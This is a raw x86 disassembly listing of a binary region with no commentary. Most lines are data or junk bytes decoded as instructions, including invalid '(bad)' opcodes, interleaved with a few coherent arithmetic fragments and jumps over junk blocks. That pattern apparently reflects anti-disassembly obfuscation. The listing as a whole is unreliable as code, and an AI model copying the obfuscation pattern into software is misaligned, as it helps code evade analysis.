  407c7a:	ins    DWORD PTR es:[edi],dx
  407c7b:	or     ecx,esp
  407c7d:	out    dx,al
  407c7e:	xchg   edi,eax
  407c7f:	ins    BYTE PTR es:[edi],dx
  407c80:	cmp    ecx,DWORD PTR [eax+0x60]
  407c83:	sbb    al,0x6
  407c85:	pop    es
  407c86:	push   ebx
  407c87:	xchg   ebx,eax
  407c88:	inc    eax
  407c89:	mov    ecx,DWORD PTR [esi-0x33]
  407c8c:	call   0xb6d17ea2
  407c91:	adc    al,0x56
  407c93:	les    ebp,FWORD PTR ds:0x19d20edc
  407c99:	inc    esp
  407c9a:	push   ds
  407c9b:	popa   
  407c9c:	push   ds
  407c9d:	pushf  
  407c9e:	mov    edx,DWORD PTR [ebp-0x6d]
  407ca1:	loope  0x407ca8
  407ca3:	cmp    BYTE PTR [ebp+0x1c],dl
  407ca6:	test   eax,0xe271cbe7
  407cab:	dec    esi
  407cac:	mul    bl
  407cae:	xor    edx,eax
  407cb0:	xor    edi,eax
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax-0x4e591c0b]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407ccb
  407ce1:	pusha  
  407ce2:	das    
  407ce3:	mov    al,dl
  407ce5:	retf   
  407ce6:	leave  
  407ce7:	enter  0x479d,0x2f
  407ceb:	sbb    dl,bh
  407ced:	dec    edx
  407cee:	or     eax,0x37d46109
  407cf3:	cdq    
  407cf4:	and    al,0xcf
  407cf6:	adc    al,0xdd
  407cf8:	test   BYTE PTR ds:0xc75b9dd8,bh
  407cfe:	push   ebx
  407cff:	aaa    
  407d00:	pop    ecx
  407d01:	sub    esp,ecx
  407d03:	sub    BYTE PTR [esi],bh
  407d05:	leave  
  407d06:	aas    
  407d07:	sub    ah,BYTE PTR [ebx+0x10]
  407d0a:	test   BYTE PTR [edi-0x61],dh
  407d0d:	std    
  407d0e:	push   esp
  407d0f:	imul   eax,DWORD PTR [esi-0xa71a1cd],0xffffffea
  407d16:	pop    ecx
  407d17:	xchg   esp,eax
  407d18:	js     0x407d27
  407d1a:	stos   BYTE PTR es:[edi],al
  407d1b:	ror    ah,0x3b
  407d1e:	popf   
  407d1f:	sub    al,dl
  407d21:	jl     0x407d11
  407d23:	in     eax,0x67
  407d25:	sbb    al,0xce
  407d27:	push   cs
  407d28:	and    BYTE PTR [edi-0x57392930],0xbf
  407d2f:	lea    ebp,[ecx+0x264ccb14]
  407d35:	jns    0x407d40
  407d37:	ja     0x407cea
  407d39:	cmc    
  407d3a:	in     al,0x13
  407d3c:	les    ebx,FWORD PTR [ebx+0x27d4b9f]
  407d42:	xor    dh,ch
  407d44:	loope  0x407cf8
  407d46:	jb     0x407d56
  407d48:	sbb    ch,BYTE PTR [eax+0xf]
  407d4b:	loopne 0x407ce4
  407d4d:	sbb    eax,0x917c68c9
  407d52:	adc    BYTE PTR [eax+edi*8+0x4dd94c7c],0x86
  407d5a:	pop    ebx
  407d5b:	sub    eax,0xf3b731ae
  407d60:	(bad)  
  407d61:	sbb    eax,0x2ccf46f6
  407d66:	ins    BYTE PTR es:[edi],dx
  407d67:	inc    edx
  407d68:	inc    ebx
  407d69:	inc    edi
  407d6a:	and    DWORD PTR [esi-0x523a31d],eax
  407d70:	jmp    0xbece:0xf0a331be
  407d77:	jg     0x407d7b
  407d79:	loope  0x407d10
  407d7b:	fwait
  407d7c:	and    esp,DWORD PTR [ebx+0x38b26f6a]
  407d82:	push   0x3e8cc18
  407d87:	pushf  
  407d88:	dec    DWORD PTR [ebx-0x2a936c31]
  407d8e:	stos   DWORD PTR es:[edi],eax
  407d8f:	dec    edi
  407d90:	leave  
  407d91:	jno    0x407d92
  407d93:	or     ebp,DWORD PTR [ebx-0x56572f78]
  407d99:	mov    esi,0x79fd27b2
  407d9e:	ret    0x2d6c
  407da1:	dec    ebx
  407da2:	in     eax,0x70
  407da4:	sbb    dl,bh
  407da6:	popf   
  407da7:	in     al,0x8
  407da9:	mov    al,0xa3
  407dab:	and    eax,0x1b67a002
  407db0:	sbb    DWORD PTR [esp+eiz*4],edi
  407db3:	push   ss
  407db4:	jg     0x407dd5
  407db6:	enter  0xcda7,0x67
  407dba:	call   FWORD PTR [ecx+0x43088105]
  407dc0:	mov    ds:0x643ca737,al
  407dc5:	inc    ecx
  407dc6:	(bad)  
  407dc7:	scas   eax,DWORD PTR es:[edi]
  407dc8:	adc    bh,dl
  407dca:	fnstcw WORD PTR ds:0xee4f3f65
  407dd0:	aaa    
  407dd1:	in     al,dx
  407dd2:	mov    eax,0x3ec9e7c8
  407dd7:	test   al,0xdf
  407dd9:	pusha  
  407dda:	loop   0x407e06
  407ddc:	mov    ?,WORD PTR [esi+edx*4]
  407ddf:	aad    0x71
  407de1:	gs je  0x407e0b
  407de4:	push   ss
  407de5:	or     eax,DWORD PTR [ecx+eiz*2]
  407de8:	xor    eax,0x4030fe58
  407ded:	ror    DWORD PTR [ecx+0x6442173e],cl
  407df3:	aam    0xf9
  407df5:	(bad)  
  407df6:	loop   0x407da9
  407df8:	xor    al,0xe5
  407dfa:	fs rcr ecx,cl
  407dfd:	mov    esp,0x78edc82f
  407e02:	xor    al,0x98
  407e04:	gs int 0x27
  407e07:	push   ecx
  407e08:	inc    ebx
  407e09:	shl    BYTE PTR [ebx],0x21
  407e0c:	mov    eax,0xd1bd91ce
  407e11:	ss js  0x407d95
  407e14:	jmp    0x407e1c
  407e16:	test   BYTE PTR [edi-0xf14ea08],bl
  407e1c:	mov    ch,0xb2
  407e1e:	push   esi
  407e1f:	dec    ebp
  407e20:	mov    al,0x98
  407e22:	dec    ebp
  407e23:	dec    edx
  407e24:	dec    ebx
  407e25:	push   ds
  407e26:	pop    ss
  407e27:	sahf   
  407e28:	sbb    DWORD PTR [edx-0x7b],edx
  407e2b:	or     cl,BYTE PTR [eax+0x7c]
  407e2e:	stos   BYTE PTR es:[edi],al
  407e2f:	sbb    bh,BYTE PTR [ecx]
  407e31:	mov    ebx,0xcd005230
  407e36:	inc    ebx
  407e37:	daa    
  407e38:	and    BYTE PTR [edx-0x45],dh
  407e3b:	cmp    dh,bl
  407e3d:	jnp    0x407e4c
  407e3f:	sub    edi,DWORD PTR [ecx]
  407e41:	dec    ebp
  407e42:	aaa    
  407e43:	mov    esp,0xc60350fa
  407e48:	in     eax,0xc1
  407e4a:	dec    edx
  407e4b:	sub    edi,DWORD PTR ds:0xe25bdc3b
  407e51:	ficomp DWORD PTR [edi]
  407e53:	inc    esp
  407e54:	ins    DWORD PTR es:[edi],dx
  407e55:	xchg   ecx,eax
  407e56:	inc    edi
  407e57:	(bad)  
  407e58:	aam    0x9d
  407e5a:	into   
  407e5b:	jl     0x407eac
  407e5d:	sbb    cl,ch
  407e5f:	mov    edi,0xb58c8aa4
  407e64:	int    0xdd
  407e66:	inc    ebp
  407e67:	data16 lods al,BYTE PTR ds:[esi]
  407e69:	push   esi
  407e6a:	fstp   DWORD PTR [ebx+ebp*8]
  407e6d:	outs   dx,DWORD PTR ds:[esi]
  407e6e:	inc    eax
  407e6f:	int    0xe9
  407e71:	sbb    dl,BYTE PTR [edx]
  407e73:	das    
  407e74:	ja     0x407e82
  407e7a:	mov    edx,DWORD PTR [ebp-0x2c]
  407e7d:	jmp    0x408770
  407e82:	mov    edx,DWORD PTR [ebp-0x34]
  407e85:	mov    edi,DWORD PTR [ebp-0x4]
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	mov    dl,bh
  407e9f:	imul   eax,DWORD PTR [ecx+edx*1],0x8a7e7ecd
  407ea6:	jg     0x407f26
  407ea8:	jle    0x407efc
  407eaa:	xor    al,0xe4
  407eac:	mov    bl,ch
  407eae:	inc    ecx
  407eaf:	in     eax,dx
  407eb0:	loop   0x407eac
  407eb2:	push   edx
  407eb3:	adc    al,0xf7
  407eb5:	sub    ecx,ecx
  407eb7:	dec    DWORD PTR [ebx]
  407eb9:	push   eax
  407eba:	scas   al,BYTE PTR es:[edi]
  407ebb:	in     al,dx
  407ebc:	jbe    0x407f0a
  407ebe:	mov    dh,0x7b
  407ec0:	faddp  st(5),st
  407ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ec3:	mov    ebp,DWORD PTR [edx-0x4]
  407ec6:	cmp    dl,BYTE PTR [ebx+0xfb96e19]
  407ecc:	idiv   edx
  407ece:	jmp    FWORD PTR [edi]
  407ed0:	xor    eax,0xb9bc2433
  407ed5:	lock adc eax,0x369d4cf6
  407edb:	cmp    al,0x9f
  407edd:	imul   esp,edx,0x75c20cbb
  407ee3:	jmp    0x4812b953
  407ee8:	lock pop ebp
  407eea:	mov    WORD PTR ds:0x1122b91c,ss
  407ef0:	ss push ds
  407ef2:	lock fistp WORD PTR [ecx+0x32f50faf]
  407ef9:	shr    BYTE PTR [edx],cl
  407efb:	xchg   edi,eax
  407efc:	scas   eax,DWORD PTR es:[edi]
  407efd:	mov    dh,0x10
  407eff:	push   cs
  407f00:	sahf   
  407f01:	ja     0x407ebf
  407f03:	mov    ebx,0x3fc950e4
  407f08:	loope  0x407f51
  407f0a:	pop    esp
  407f0b:	stos   DWORD PTR es:[edi],eax
  407f0c:	push   ds
  407f0d:	xchg   edx,edi
  407f0f:	std    
  407f10:	aad    0x9a
  407f12:	addr16 push ebp
  407f14:	in     eax,dx
  407f15:	nop
  407f16:	fcom   QWORD PTR [edx+0x6b]
  407f19:	sbb    ebp,DWORD PTR [esi+0xeb23aee]
  407f1f:	sbb    ch,BYTE PTR [ebp-0x2c]
  407f22:	les    ebx,FWORD PTR [ebp+0x54cb50d3]
  407f28:	mov    eax,ds:0x171857f2
  407f2d:	sub    ecx,ecx
  407f2f:	mov    eax,edx
  407f31:	push   esp
  407f32:	inc    edi
  407f33:	pop    ebx
  407f34:	mov    ecx,0x6d4578d7
  407f39:	dec    edi
  407f3a:	push   esi
  407f3b:	dec    edi
  407f3c:	sahf   
  407f3d:	scas   al,BYTE PTR es:[edi]
  407f3e:	jae    0x407f86
  407f40:	mov    bh,0xf6
  407f42:	sub    BYTE PTR [ecx+ebp*4],bh
  407f45:	xor    DWORD PTR [edx+0x10],0xffffffb3
  407f49:	fdivr  DWORD PTR [eax-0x30ee3370]
  407f4f:	inc    ebp
  407f50:	dec    ecx
  407f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f52:	aas    
  407f53:	jmp    0x407f10
  407f55:	pop    edx
  407f56:	cs sbb al,dl
  407f59:	(bad)  
  407f5a:	lahf   
  407f5b:	xchg   esp,eax
  407f5c:	scas   al,BYTE PTR es:[edi]
  407f5d:	mov    cl,0x6e
  407f5f:	(bad)  
  407f61:	imul   ecx,esp,0xffffffe9
  407f64:	cmp    eax,0xaf78f974
  407f69:	xchg   ebx,eax
  407f6a:	mov    ah,0xd1
  407f6c:	xchg   esi,eax
  407f6d:	sbb    eax,0x9b79bc3d
  407f72:	push   edx
  407f73:	add    cl,ch
  407f75:	jne    0x407f19
  407f77:	(bad)  
  407f78:	sar    cl,1
  407f7a:	xchg   esi,eax
  407f7b:	(bad)  
  407f7c:	call   0x4bde:0x330dca6b
  407f83:	mov    cl,BYTE PTR [ebx+0x13eb1e71]
  407f89:	mov    bl,ch
  407f8b:	clc    
  407f8c:	push   ds
  407f8d:	cmp    BYTE PTR [edi-0x21305cdd],bh
  407f93:	and    bl,dl
  407f95:	imul   edx,edx,0x4da7be06
  407f9b:	pop    ecx
  407f9c:	arpl   bx,bp
  407f9e:	ss dec edx
  407fa0:	pop    ecx
  407fa1:	xchg   BYTE PTR [ebx],bh
  407fa3:	xchg   ebp,eax
  407fa4:	mov    cl,0x90
  407fa6:	jle    0x407f8e
  407fa8:	mov    dl,0x76
  407faa:	adc    dl,BYTE PTR [ebx-0x1a]
  407fad:	fucomi st,st(6)
  407faf:	xchg   ecx,eax
  407fb0:	test   DWORD PTR [eax-0x9c38f12],ebx
  407fb6:	mov    ebp,0x2c27b11
  407fbb:	sbb    DWORD PTR [esi],esp
  407fbd:	push   edx
  407fbe:	inc    edx
  407fbf:	or     DWORD PTR [eax],ebp
  407fc1:	(bad)  
  407fc2:	jo     0x408038
  407fc4:	retf   0xffdc
  407fc7:	dec    ebx
  407fc8:	sbb    edi,ebx
  407fca:	fld    TBYTE PTR [edx-0x7f9db0db]
  407fd0:	inc    esp
  407fd1:	push   ebx
  407fd2:	jne    0x407ffa
  407fd4:	jg     0x40801d
  407fd6:	sti    
  407fd7:	mov    ecx,DWORD PTR [ebx]
  407fd9:	repnz and al,0xdb
  407fdc:	bound  esp,QWORD PTR [ecx+0x3c]
  407fdf:	jo     0x40804b
  407fe1:	xor    ebp,DWORD PTR [esi-0x62a5d44a]
  407fe7:	sti    
  407fe8:	dec    ecx
  407fe9:	push   0x22
  407feb:	clc    
  407fec:	push   ecx
  407fed:	loope  0x408033
  407fef:	stos   DWORD PTR es:[edi],eax
  407ff0:	or     esi,esp
  407ff2:	mov    ah,0xda
  407ff4:	mov    dl,0xdb
  407ff6:	add    al,0x23
  407ff8:	and    al,0x40
  407ffa:	addr16 mov eax,ds:0x1a9b
  407ffe:	inc    edx
  407fff:	addr16 iret 
  408001:	jp     0x407fb3
  408003:	or     eax,0xcedd04a4
  408008:	inc    esp
  408009:	mov    ecx,0x36a540a3
  40800e:	or     eax,0xa7fc7eef
  408013:	dec    esp
  408014:	std    
  408015:	cmp    al,0xb2
  408017:	or     DWORD PTR [ebx],ecx
  408019:	out    0x5,al
  40801b:	or     eax,0x9d4ab97a
  408020:	adc    BYTE PTR [eax+esi*4-0x4dbfffa7],0x5d
  408028:	cs push es
  40802a:	leave  
  40802b:	popf   
  40802c:	in     eax,0x77
  40802e:	inc    eax
  40802f:	retf   0x45cc
  408032:	and    edx,DWORD PTR [edi+0x15]
  408035:	xlat   BYTE PTR ds:[ebx]
  408036:	mov    WORD PTR [edx],?
  408038:	in     eax,0xc5
  40803a:	je     0x407ffd
  40803c:	sbb    eax,DWORD PTR [ebx]
  40803e:	stc    
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	mov    esp,0xadcc02c2
  40807e:	retf   0x7e7e
  408081:	mov    bh,BYTE PTR [edi+0x7e]
  408084:	jle    0x40807d
  408086:	addr16 into 
  408088:	lea    esp,[ebx]
  40808a:	lahf   
  40808b:	cmp    eax,0x90b7d8c7
  408090:	mov    al,0xb1
  408092:	stc    
  408093:	add    esi,ebp
  408095:	les    ebx,FWORD PTR [esi+0x78]
  408098:	sub    DWORD PTR [edx],eax
  40809a:	and    eax,0xf60daa92
  40809f:	mov    edx,0x86fac23e
  4080a4:	jnp    0x408104
  4080a6:	hlt    
  4080a7:	call   0x1e4b6554
  4080ac:	arpl   ax,di
  4080ae:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4080b0:	scas   eax,DWORD PTR es:[edi]
  4080b1:	jne    0x408038
  4080b3:	fnstsw WORD PTR [ecx-0x446b923]
  4080b9:	iret   
  4080ba:	mov    bh,0x5f
  4080bc:	icebp  
  4080bd:	mov    WORD PTR [edx-0x47],ds
  4080c0:	xchg   esi,eax
  4080c1:	in     al,0x76
  4080c3:	xchg   ecx,eax
  4080c4:	sub    eax,0x9cd6accf
  4080c9:	cld    
  4080ca:	in     eax,0x3
  4080cc:	repz mov al,ds:0x42f03389
  4080d2:	or     al,0xb2
  4080d4:	test   esp,0x9d3ade98
  4080da:	jmp    0x58bf9dfd
  4080df:	jle    0x408143
  4080e1:	outs   dx,DWORD PTR ds:[esi]
  4080e2:	(bad)  
  4080e3:	or     ecx,esp
  4080e5:	sub    BYTE PTR [ecx+eiz*1],al
  4080e8:	test   BYTE PTR [edi-0x1f19bc5a],dl
  4080ee:	add    eax,0xdf105535
  4080f3:	dec    eax
  4080f4:	mov    BYTE PTR [esi],dl
  4080f6:	mov    al,0xaa
  4080f8:	sbb    bh,BYTE PTR gs:[edx-0x62]
  4080fc:	and    al,0x74
  4080fe:	aas    
  4080ff:	jecxz  0x408083
  408101:	das    
  408102:	lahf   
  408103:	mov    cl,0x53
  408105:	sbb    DWORD PTR [ebp+eiz*2-0x5c],eax
  408109:	pusha  
  40810a:	mov    WORD PTR [edx-0x7c0a837e],ds
  408110:	ret    0xb459
  408113:	or     DWORD PTR [edx],ebp
  408115:	dec    edi
  408116:	popa   
  408117:	lods   eax,DWORD PTR ds:[esi]
  408118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408119:	js     0x408186
  40811b:	xchg   esi,eax
  40811c:	ror    esp,1
  40811e:	jle    0x408102
  408120:	xchg   edx,eax
  408121:	xor    eax,0x482f1090
  408126:	add    ecx,DWORD PTR [eax+esi*4+0x16928ced]
  40812d:	pop    esp
  40812e:	ret    
  40812f:	pop    ecx
  408130:	fsubr  DWORD PTR [edx-0x42]
  408133:	push   ebp
  408134:	cmp    ebp,edx
  408136:	mov    edx,0x1fd64a81
  40813b:	stc    
  40813c:	mov    ah,0x49
  40813e:	enter  0xd0a5,0x62
  408142:	test   al,0x2c
  408144:	call   0x882c7a70
  408149:	mov    dh,0x24
  40814b:	xor    BYTE PTR [edx+0x3d],cl
  40814e:	sbb    al,0x10
  408150:	add    eax,0xda12c3c7
  408155:	fdivr  DWORD PTR [edx+eax*1+0x7fb6e313]
  40815c:	or     esp,DWORD PTR [ecx-0x15ca6016]
  408162:	mov    edx,0x9eab3985
  408167:	dec    edx
  408168:	ss inc esp
  40816a:	sub    eax,0xb3af00c9
  40816f:	sub    DWORD PTR [eax],ecx
  408171:	lds    edx,FWORD PTR [esi-0x1fd14d8c]
  408177:	xchg   edi,eax
  408178:	cmp    eax,0xcb1ae805
  40817d:	daa    
  40817e:	call   0xd2e3604
  408183:	sbb    dh,al
  408185:	rcr    BYTE PTR [edx-0x6f],cl
  408188:	inc    esp
  408189:	or     al,0x75
  40818b:	cli    
  40818c:	repnz xor DWORD PTR [ecx+edi*1],esi
  408190:	mov    WORD PTR [ebp+0x59],ss
  408193:	inc    esp
  408194:	xchg   di,ax
  408196:	iret   
  408197:	xchg   BYTE PTR [edi+0x2e9c9770],ch
  40819d:	adc    eax,0xc4788136
  4081a2:	pop    esi
  4081a3:	mov    gs,ebp
  4081a5:	fisub  WORD PTR [ebp+0x2b]
  4081a8:	adc    al,0xbf
  4081aa:	sahf   
  4081ab:	aam    0x9f
  4081ad:	pop    edx
  4081ae:	add    ebx,DWORD PTR [ebx-0x31]
  4081b1:	lea    esp,[eax]
  4081b3:	std    
  4081b4:	xor    eax,0xc31b3bec
  4081b9:	fld    TBYTE PTR [eax]
  4081bb:	ret    0x5e10
  4081be:	sub    esp,DWORD PTR [esi]
  4081c0:	es popf 
  4081c2:	xor    DWORD PTR [edi+0x7b168a87],edi
  4081c8:	ficom  DWORD PTR [ecx+edi*4-0x57]
  4081cc:	fs in  al,dx
  4081ce:	inc    edx
  4081cf:	es stos BYTE PTR es:[edi],al
  4081d1:	in     al,0xab
  4081d3:	stc    
  4081d4:	repnz cmp al,0x8
  4081d7:	dec    ebx
  4081d8:	and    eax,0xc7a1e8e5
  4081dd:	test   BYTE PTR [esi],bl
  4081df:	out    0xf6,al
  4081e1:	xchg   ecx,eax
  4081e2:	fidiv  WORD PTR [edx+0x436dedb7]
  4081e8:	and    al,0x92
  4081ea:	xor    eax,0x4e580f76
  4081ef:	or     bh,al
  4081f1:	jns    0x408248
  4081f3:	in     eax,0x10
  4081f5:	cmp    bl,BYTE PTR [eax-0x69]
  4081f8:	sub    al,0x52
  4081fa:	sbb    dh,cl
  4081fc:	pusha  
  4081fd:	das    
  4081fe:	data16 cs gs jno 0x40825f
  408203:	fimul  DWORD PTR [edx+ebx*8-0x2b853882]
  40820a:	in     al,dx
  40820b:	xor    eax,0xeac7749e
  408210:	dec    ecx
  408211:	mov    ecx,0x60727370
  408216:	lds    ebp,FWORD PTR [eax+edi*8]
  408219:	add    edx,ecx
  40821b:	jmp    0x4083cc
  408220:	dec    esp
  408221:	adc    BYTE PTR [edi],bh
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x39de:0x8d7f6a62
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x4081cd
  408239:	xchg   edx,eax
  40823a:	pop    ecx
  40823b:	rcl    BYTE PTR [ebx],0x32
  40823e:	gs inc edx
  408240:	or     eax,0x9465c5ce
  408245:	cmc    
  408246:	int3   
  408247:	add    ch,BYTE PTR ds:0xad890d63
  40824d:	div    DWORD PTR [ebx+0x1d]
  408250:	aad    0x3c
  408252:	nop
  408253:	cmp    eax,0xdc020b24
  408258:	stc    
  408259:	sahf   
  40825a:	or     eax,0x89e26aba
  40825f:	jae    0x408280
  408261:	adc    DWORD PTR [edi],esp
  408263:	pushf  
  408264:	aad    0x14
  408266:	sbb    eax,0x93bbd41f
  40826b:	mov    dl,0x82
  40826d:	pop    eax
  40826e:	push   edi
  40826f:	push   ds
  408270:	jge    0xd1160ad0
  408276:	xor    al,0xa9
  408278:	or     BYTE PTR [edi+0x14],al
  40827b:	retf   
  40827c:	cmp    BYTE PTR [eax+0x11],al
  40827f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408280:	cmc    
  408281:	rcl    BYTE PTR [eax+0x54],0xea
  408285:	xor    DWORD PTR [esi+0x7de40848],esp
  40828b:	adc    eax,0x8a2f1de3
  408290:	xor    bh,al
  408292:	stc    
  408293:	inc    ebp
  408294:	in     al,0x69
  408296:	push   0x58
  408298:	out    dx,al
  408299:	add    eax,0x8d94db72
  40829e:	cmp    eax,DWORD PTR [edx]
  4082a0:	mov    esp,0x16208834
  4082a5:	cmp    BYTE PTR [ebx+esi*8],dh
  4082a8:	repnz add eax,DWORD PTR [ebx+ecx*2+0xa5e686b]
  4082b0:	xchg   ebx,eax
  4082b1:	imul   esp,DWORD PTR [esi+0xd949a82],0xa54d511e
  4082bb:	push   0x7262eecd
  4082c0:	scas   eax,DWORD PTR es:[edi]
  4082c1:	or     al,0xdd
  4082c3:	call   0xeb7a:0xea209050
  4082ca:	xlat   BYTE PTR ds:[ebx]
  4082cb:	out    dx,eax
  4082cc:	pop    edx
  4082cd:	jnp    0x4082be
  4082cf:	and    cl,cl
  4082d1:	sbb    esp,esi
  4082d3:	stos   BYTE PTR es:[edi],al
  4082d4:	fwait
  4082d5:	bound  esp,QWORD PTR [edi+0x9]
  4082d8:	mov    al,0x79
  4082da:	pop    ds
  4082db:	shl    BYTE PTR [eax+0x391b535],0x52
  4082e2:	and    BYTE PTR [ebp+0x715594f3],ch
  4082e8:	retf   0x55b6
  4082eb:	mov    edx,0x6231b4d0
  4082f0:	and    DWORD PTR es:[ebx],ebp
  4082f3:	icebp  
  4082f4:	cli    
  4082f5:	or     al,0xe7
  4082f7:	cmp    al,0x50
  4082f9:	int    0xd2
  4082fb:	cmp    DWORD PTR [ebx-0x324b77e],ebp
  408301:	mov    gs,WORD PTR [ecx+0x2b]
  408304:	out    0x3,eax
  408306:	adc    al,0x19
  408308:	frstor [eax+0x29]
  40830b:	stos   BYTE PTR es:[edi],al
  40830c:	push   edi
  40830d:	push   esp
  40830e:	stc    
  40830f:	(bad)  
  408311:	or     cl,BYTE PTR [ecx]
  408313:	mov    dl,0xbb
  408315:	sub    BYTE PTR [ecx-0x34],bl
  408318:	and    BYTE PTR ds:0xe8da4e4e,ah
  40831e:	in     eax,dx
  40831f:	out    0x89,eax
  408321:	pop    esi
  408322:	dec    ebx
  408323:	xor    eax,0x8cf5a59c
  408328:	pop    edx
  408329:	sub    ebp,DWORD PTR [ebp+0x5c75b6ec]
  40832f:	dec    edi
  408330:	loop   0x4082be
  408332:	or     al,0x84
  408334:	aam    0xef
  408336:	std    
  408337:	and    ebx,0x3e
  40833a:	xor    dl,dl
  40833c:	gs pushf 
  40833e:	inc    ebp
  40833f:	js     0x408377
  408341:	ror    dl,1
  408343:	dec    DWORD PTR [edx-0x2ac4652f]
  408349:	sbb    bl,BYTE PTR [edx-0x2ac5a1c4]
  40834f:	in     al,0xad
  408351:	xchg   edi,eax
  408352:	mov    DWORD PTR [esi],0xe250174f
  408358:	ins    DWORD PTR es:[edi],dx
  408359:	xchg   DWORD PTR [ebp+0x5f],edi
  40835c:	div    BYTE PTR [edx]
  40835e:	push   ebx
  40835f:	pop    eax
  408360:	add    DWORD PTR [ebp+0x2866c6ee],0x5a06219f
  40836a:	sub    bh,BYTE PTR [esi+edx*8-0x23c58780]
  408371:	jmp    0x408393
  408373:	imul   ebx,DWORD PTR ds:0x3573e53a,0xdb6c8244
  40837d:	and    DWORD PTR [eax+ecx*8],edx
  408380:	mov    WORD PTR [edi+ebp*4-0x5995227c],es
  408387:	adc    DWORD PTR ds:0x7ce2bbd9,edx
  40838d:	and    eax,0x3ebe2884
  408392:	leave  
  408393:	mov    esp,0x259bcae4
  408398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408399:	xor    BYTE PTR [ebx],ch
  40839b:	push   es
  40839c:	or     eax,0xb5548b51
  4083a1:	pop    esp
  4083a2:	leave  
  4083a3:	scas   eax,DWORD PTR es:[di]
  4083a5:	xchg   esp,eax
  4083a6:	pop    es
  4083a7:	(bad)
  4083aa:	pop    ebp
  4083ab:	jne    0x4083ba
  4083ad:	and    eax,0xb8940b6b
  4083b2:	or     al,0x9b
  4083b4:	jmp    0x408375
  4083b6:	mov    ebp,0xc92133be
  4083bb:	call   0x85f676cd
  4083c0:	jge    0x4083f8
  4083c2:	inc    ebx
  4083c3:	push   eax
  4083c4:	mov    ebp,0xd60cf3d8
  4083c9:	jb     0x4083e4
  4083cb:	fs imul edx,edi
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	in     al,0xfa
  4083ea:	dec    BYTE PTR [edx]
  4083ec:	push   ebp
  4083ed:	leave  
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x40843e
  4083f5:	dec    edx
  4083f6:	adc    al,0x9
  4083f8:	je     0x4083e4
  4083fa:	test   BYTE PTR ds:0x36ac5e61,ch
  408400:	test   DWORD PTR [ecx],edi
  408402:	mov    eax,ds:0xdb3fd418
  408407:	in     eax,0xc8
  408409:	jne    0x40845d
  40840b:	lds    ebp,FWORD PTR [edx-0x3b]
  40840e:	pop    ss
  40840f:	ja     0x4083a2
  408411:	pusha  
  408412:	mov    esp,0x84e8f6f1
  408417:	mov    eax,ds:0x58fbe57f
  40841c:	cmp    eax,0xdce633fc
  408421:	ins    DWORD PTR es:[edi],dx
  408422:	test   eax,0xa845453b
  408427:	scas   al,BYTE PTR es:[edi]
  408428:	mov    edi,0x4d983c3a
  40842d:	rcr    BYTE PTR [esi],cl
  40842f:	jbe    0x4083ec
  408431:	ror    ebx,cl
  408433:	inc    esp
  408434:	push   ecx
  408435:	test   al,0x36
  408437:	fs inc esi
  408439:	mov    edx,0xa72e348c
  40843e:	push   0x76
  408440:	mov    dh,0xed
  408442:	adc    eax,0x3ccba160
  408447:	mov    edi,0x78a00642
  40844c:	das    
  40844d:	mov    esi,0x3c03d05e
  408452:	add    ah,bl
  408454:	in     eax,dx
  408455:	mov    eax,ds:0x1d042ddc
  40845a:	pop    es
  40845b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40845c:	mov    bl,0x22
  40845e:	out    dx,eax
  40845f:	xlat   BYTE PTR ds:[ebx]
  408460:	cmp    dl,ch
  408462:	jl     0x40847f
  408464:	and    dh,ah
  408466:	cmc    
  408467:	das    
  408468:	aam    0x38
  40846a:	mov    bl,0x69
  40846c:	xchg   DWORD PTR [eax+0x46ff73d7],ecx
  408472:	mov    ebp,DWORD PTR [ebx+0x274eae09]
  408478:	or     BYTE PTR [ebp+0x30404f5],0x47
  40847f:	das    
  408480:	loopne 0x408422
  408482:	mov    cl,0x33
  408484:	sbb    eax,DWORD PTR [eax+edx*4]
  408487:	mov    al,0x24
  408489:	ror    bh,cl
  40848b:	daa    
  40848c:	cli    
  40848d:	lahf   
  40848e:	mov    al,ds:0xbb55c0fe
  408493:	jge    0x4084e4
